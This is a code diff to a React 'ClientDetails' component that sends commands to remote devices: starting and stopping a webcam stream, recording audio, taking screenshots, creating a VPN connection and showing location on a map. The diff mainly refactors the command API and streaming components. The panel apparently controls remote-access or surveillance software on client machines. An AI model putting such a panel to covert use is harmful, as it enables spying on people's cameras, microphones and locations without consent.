@@ -17,6 +17,8 @@ import type { MenuProps } from 'antd';
 import instance from 'service/api';
 import { MapContainer, Marker, Popup, TileLayer } from 'react-leaflet';
 import 'leaflet/dist/leaflet.css';
+import { CameraStream } from 'components/CameraStream/CameraStream';
+import { AudioStream } from 'components/AudioStream/AudioStream';
 
 const { TabPane } = Tabs;
 
@@ -63,6 +65,11 @@ interface Location {
     status: string;
     lat: number;
     lon: number;
+}
+
+interface SendCommandBody {
+    device_id: string;
+    command: string;
 }
 
 type NotificationType = 'success' | 'info' | 'warning' | 'error';
@@ -122,7 +129,12 @@ export const ClientDetails: React.FC = () => {
     // Отправка команд
     const sendCommand = async (cmd: string) => {
         try {
-            await instance.post(`/command?cmd=${cmd}&id=${id}`);
+            let body: SendCommandBody = {
+                command: cmd,
+                device_id: id || ''
+            };
+
+            await instance.post(`/send_command`, body);
             openNotificationWithIcon('success', cmd);
         } catch (err) {
             openNotificationWithIcon('error', cmd);
@@ -180,7 +192,7 @@ export const ClientDetails: React.FC = () => {
 
     // Вебкамера
     const handleOpenWebcamModal = async () => {
-        await sendCommand('start');
+        await sendCommand('start_camera');
         setWebcamModalVisible(true);
 
         // Каждую секунду обновляем картинку
@@ -190,7 +202,7 @@ export const ClientDetails: React.FC = () => {
     };
 
     const handleStopWebcamModal = async () => {
-        await sendCommand('stop');
+        await sendCommand('stop_camera');
         setWebcamModalVisible(false);
 
         if (webcamIntervalRef.current !== null) {
@@ -243,7 +255,7 @@ export const ClientDetails: React.FC = () => {
                 <Col>
                     <Space>
                         <Button onClick={handleOpenWebcamModal}>View the webcam</Button>
-                        <Button onClick={() => sendCommand('vpn_create')}>
+                        <Button onClick={() => sendCommand('create_vpn')}>
                             Create VPN connection
                         </Button>
                         <Button onClick={handleRecordAudio}>Record Audio</Button>
@@ -340,11 +352,7 @@ export const ClientDetails: React.FC = () => {
                 maskClosable={false}
                 footer={<Button onClick={handleStopWebcamModal}>Stop streaming</Button>}
             >
-                <img
-                    src={webcamUrl}
-                    alt="Webcam"
-                    style={{ width: '100%', border: '1px solid #ccc' }}
-                />
+                <CameraStream id={id || ''} />
             </Modal>
 
             {/* Screenshot Modal */}
@@ -368,9 +376,7 @@ export const ClientDetails: React.FC = () => {
                 onCancel={() => setAudioModalVisible(false)}
                 footer={null}
             >
-                <audio src={audioUrl} controls style={{ width: '100%' }}>
-                    Your browser does not support the audio element.
-                </audio>
+                <AudioStream deviceId={id || ''} />
             </Modal>
         </div>
     );
